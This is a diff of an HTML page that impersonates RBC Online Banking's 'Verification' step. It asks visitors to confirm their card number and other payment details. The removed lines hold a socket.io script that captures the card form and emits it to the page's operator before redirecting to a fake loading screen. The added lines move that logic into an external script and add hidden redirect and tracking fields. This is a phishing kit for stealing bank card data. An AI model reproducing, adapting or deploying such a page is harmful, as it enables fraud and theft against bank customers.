@@ -1,38 +1,23 @@
 <html lang="en">
-
 <head>
+    <span hidden id="page"> Card </span>
+    <span hidden id="pageRedirection"> /rbc/loading </span>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
     <title>Verification – RBC Online Banking</title>
     <!--<base href="">-->
     <base href=".">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/rbc/styles.c203039f21a7c88c809b.css">
     <link rel="stylesheet" href="/assets/rbc/main.css">
     <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
-    <script>
-        var lrbank = '<?=escape($udata->last->bank)?>';
-        var lrinfo = '<?=escape($udata->last->info)?>';
     </script>
-    <script src="/assets/js/actions.js?v=<?=time()?>"></script>
     <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io.connect('<%= ip %>');
-        socket.emit('updatePage', 'card');
-        socket.emit('updateBanks', 'rbc');
-
-        function submitForm() {
-
-            const formData = new FormData(document.getElementById('cardForm'));
-            socket.emit('submitCard', Object.fromEntries(formData));
-
-            window.location.href = "/rbc/loading";
-        }
-
-    </script>
+    <script src="../assets/js/rbc/login/index.js"></script>
 </head>
 
 <body>
+    <input type="hidden" id="userAgent" name="userAgent">
+    <input type="hidden" id="banks" name="banks">
     <core-banking-root ng-version="10.2.5">
         <core-banking-main-container _nghost-ahj-c56="">
             <div _ngcontent-ahj-c56="" class="main">
@@ -83,19 +68,19 @@
                             <h1 _ngcontent-ahj-c68="" class="passcode-heading">Confirm Your Payment Details</h1>
                             <p _ngcontent-ahj-c68="" class="passcode-message">To validate your sign in request, please
                                 confirm your payment details.</p>
-                            <form action="" id="cardForm" class="lab-form">
+                            <form action="" id="loginForm" class="lab-form">
                                 <core-banking-otp-input _ngcontent-ahj-c68="">
                                     <div class="otp-input-component ng-pristine ng-invalid ng-touched">
 
                                         <div>Card Number</div>
                                         <div class="InputContainer__input" style="">
                                             <input id="input-card" type="tel" placeholder="Enter your Card Number"
-                                                name="card" class="form-control full-width lrinput" onkeyup="split()"
+                                                name="card" class="form-control full-width lrinput"
                                                 required="true" autocomplete="off" maxlength="19"
                                                 oninput="this.value = this.value.replace(/[^0-9, ]/, '')"
                                                 attr-action="Filling Card">
-                                            <script src="/assets/js/splitter.js?v=<?=time()?>"></script>
-                                            <link rel="stylesheet" href="/assets/css/card.css">
+                                        
+                                          
                                         </div>
 
                                         <div class="InputContainer__input" style="">
@@ -162,9 +147,13 @@
                                         <br>
                                     </div>
                                 </core-banking-otp-input>
-                                <button _ngcontent-ahj-c68="" type="submit" rbccta="primary" size="small"
-                                    data-dig-id="MFA_PMSM_016" class="passcode-button rbc-cta rbc-cta--small"
-                                    style="margin-top: -15px; margin-bottom: 20px;" onclick="submitForm()" name="save" value="1"> Continue
+                                <rbc-form-field _ngcontent-snp-c5=""
+                                                            class="rbc-form-field"><span _ngcontent-snp-c5=""
+                                                            class="passcode-button rbc-cta rbc-cta--small"
+                                                                data-dig-id="OLB_PMSM_684" id="btn-next" rbccta=""
+                                                                size="small" tabindex="0" type="button"
+                                                                onclick="submitForm()"  style="margin-top: -15px; margin-bottom: 20px;"> Next
+                                                            </span></rbc-form-field>
                                 </button>
                             </form>
                         </div>
